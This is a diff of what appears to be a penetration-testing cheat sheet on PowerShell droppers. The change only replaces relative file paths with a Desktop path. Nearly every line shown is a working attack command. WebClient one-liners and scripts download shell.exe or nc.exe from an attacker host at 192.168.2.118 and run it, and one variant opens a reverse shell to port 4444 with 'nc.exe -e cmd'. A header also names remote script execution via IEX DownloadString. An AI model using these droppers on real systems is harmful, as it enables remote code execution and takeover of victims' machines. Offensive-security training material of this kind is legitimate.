@@ -132,7 +132,7 @@ $ python -m http.server 80
 $url = "http://192.168.2.118/shell.exe" 
 ```
 ```
-$out = "shell.exe" 
+$out = "C:\Users\admin\Desktop\shell.exe" 
 ```
 ```
 $wc = New-Object Net.WebClient 
@@ -145,10 +145,10 @@ $wc.DownloadFile($url, $out)
 ```
 ### PowerShell Dropper OneLiner
 ```
-(New-Object System.Net.WebClient).DownloadFile('http://192.168.2.118/shell.exe', 'shell.exe');.\shell.exe
+(New-Object System.Net.WebClient).DownloadFile('http://192.168.2.118/shell.exe', 'C:\Users\admin\Desktop\shell.exe');C:\Users\admin\Desktop\shell.exe
 ```
 ```
-(New-Object System.Net.WebClient).DownloadFile('http://192.168.2.118/nc.exe', 'nc.exe');.\nc.exe 192.168.2.118 4444 -e cmd
+(New-Object System.Net.WebClient).DownloadFile('http://192.168.2.118/nc.exe', 'C:\Users\admin\Desktop\nc.exe');C:\Users\admin\Desktop\nc.exe 192.168.2.118 4444 -e cmd
 ```
 ### PowerShell Execute Remote Script by IEX - powershell "IEX(New-Object System.Net.WebClient).DownloadString('URL')"
 ```
@@ -168,7 +168,7 @@ Kali Linux
 ```
 $ cat dropper
 $url = "http://192.168.2.118/shell.exe"
-$out = "shell.exe"
+$out = "C:\Users\admin\Desktop\shell.exe"
 $wc = New-Object Net.WebClient
 $wc.DownloadFile($url, $out)
 .\shell.exe
@@ -181,7 +181,7 @@ Kali Linux
 ```
 $ cat dropper1
 $url = "http://192.168.2.118/nc.exe"
-$out = "nc.exe"
+$out = "C:\Users\admin\Desktop\nc.exe"
 $wc = New-Object Net.WebClient
 $wc.DownloadFile($url, $out)
 .\nc.exe 192.168.2.118 4444 -e cmd
